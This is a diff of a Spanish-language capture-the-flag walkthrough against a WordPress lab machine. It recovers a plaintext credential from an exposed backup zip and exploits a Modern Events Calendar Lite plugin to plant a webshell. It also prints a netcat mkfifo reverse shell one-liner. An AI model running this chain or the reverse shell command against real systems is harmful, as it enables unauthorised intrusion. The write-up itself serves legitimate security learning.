@@ -10,7 +10,7 @@ ___
 Usaremos `nmap -n -v --open -sV -sV -oN escaneo <IP>`.  
 Del mismo obtenemos que únicamente el puerto 80 tiene un servicio. por lo tanto se trata de una Web-App y que la versión es Apache 2.4.58 y que el sistema host en un sistema Ubuntu.
 
-Ahora, prodríamos correr también `whatweb`: `whatweb <IP>` para Footprinting.  
+Ahora, corremos también `whatweb`: `whatweb <IP>` para Footprinting Web. Vemos que además, tiene JQuery 3.7.1. Podría sernos útil.  
 
 
 2. Enumeración Web:  
@@ -53,13 +53,41 @@ Ahora, prodríamos correr también `whatweb`: `whatweb <IP>` para Footprinting.
 - /wp-admin/media-new.php
 ```
 
-De estas enumeración, por el momento nos quedamos con `/backups`. Yendo a este endpoint vemos que podemos descargar un recurso: `databaseback2may.zip`. Lo hacemos y primero revisamos localmente sin extraer para estar seguros. Lo hacemos con `unzip -l <zip>`. Vemoos muestra un único archivito llamado `29DBMay`. Ahora sí, procedemos a extraerlo con `unzip <zip>` le hacemos un `cat 29DBMay` y obtenemos las credenciales `developer:2wmy3KrGDRD%RsA7Ty5n71L^`. Investigando un poco con `hashid 2wmy3KrGDRD%RsA7Ty5n71L^` y la web vemos que no se trata de una hash válido ni base64, entonces probablemente se trata de un texto claro.  
 
-Entonces, procedemos a probar nuestras nuevas credenciales en el endpoint `/wp-login.php` y tenemos Footholding Web.
-4.  
+
+3. Búsqueda de Vulnerabilidades:
+
 
 
 #### FASE EXPLOTACIÓN:
+Web:  
+De estas enumeración, por el momento nos quedamos con `/backups`. Yendo a este endpoint vemos que podemos descargar un recurso: `databaseback2may.zip`. Lo hacemos y primero revisamos localmente sin extraer para estar seguros. Lo hacemos con `unzip -l <zip>`. Vemoos muestra un único archivito llamado `29DBMay`. Ahora sí, procedemos a extraerlo con `unzip <zip>` le hacemos un `cat 29DBMay` y obtenemos las credenciales `developer:2wmy3KrGDRD%RsA7Ty5n71L^`. Investigando un poco con `hashid 2wmy3KrGDRD%RsA7Ty5n71L^` y la web vemos que no se trata de una hash válido ni base64, entonces probablemente se trata de un texto claro.  
+
+Entonces, procedemos a probar nuestras nuevas credenciales en el endpoint `/wp-login.php` y logramos **Footholding Web**.  
+
+Sistema:  
+Navegando por el dashboard encontramos un endpoint interesante por el cual podríamos pobrar subir una WebShell para lograr acceso inicial al sistema. Este recurso es `/wp-admin/media-new.php`. Al intentar subir algún archivo nos damos cuenta que no es posible porque no tenemos los permisos como `developer`.  
+
+Entonces, probamos hacer un poco de Footprinting de la WebApp. Encontramos que la versión de WordPress es 6.8.3, que tiene algunos Plugins instalados como:
+* Askimet 5.3.2
+* Modern Events Calendar Lite 5.16.2
+
+Además tiene Temas como:  
+*  Twenty Twenty-Four 1.1
+*  Twenty Twenty-Three 1.4
+*  Twenty Twenty-Two 1.7
+			
+Encontramos otro usuario admin llamado `eric`.  
+
+Usamos la herramienta `searchsploit` buscando exploits para todo lo hallado anteriormente. Después de algún tiempo, encontramos uno directo para RCE para el Plugin Modern Events Calendar Lite 5.16.2 de Wordpress. Lo descargamos con `searchsploit -m <exploit>`.  
+
+Siguiendo las instrucciones del exploit, lo lanzamos, nos da la URI de la webshell (http://<IP_Whoiam>/wp-content/uploads/shell.php), nos dirigimos allí y nos da una [PownyWebShell](https://github.com/flozz/p0wny-shell). Esta se lanza en el navegador de una manera limitada y nos da un FootHolding básico al sistema.  
+
+
+Entonces, hacemos rápidamente un `whoami` y nos devuelve `www-data`. Dicho esto, nos apuramos a lanzar una Reverse Shell para tener más control localmente. Para ello, preparamos un listener. En este caso, uso [Penelope](https://github.com/brightio/penelope). Corremos `penelope -i <IP_local> -p <puerto_local>` y queda escuchando. 
+
+Primero vemos las herramientas instaladas en el sistema para ver con qué podemos correr la RevShell. Hacemos rápidamente `which python python2 python3 nc` y encontramos a `/usr/bin/nc`. Ahora vamos a https://www.revshells.com/ y probando y probando encontramos que la manera de lanzarla según la config de la víctima es con la versión portable (POSIX) ejecutado `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP_local> <puerto_local> >/tmp/f`
+
 #### FASE POST-EXPLOTACIÓN: Elevar Privilegios
 
 #### MITIGACIONES:  
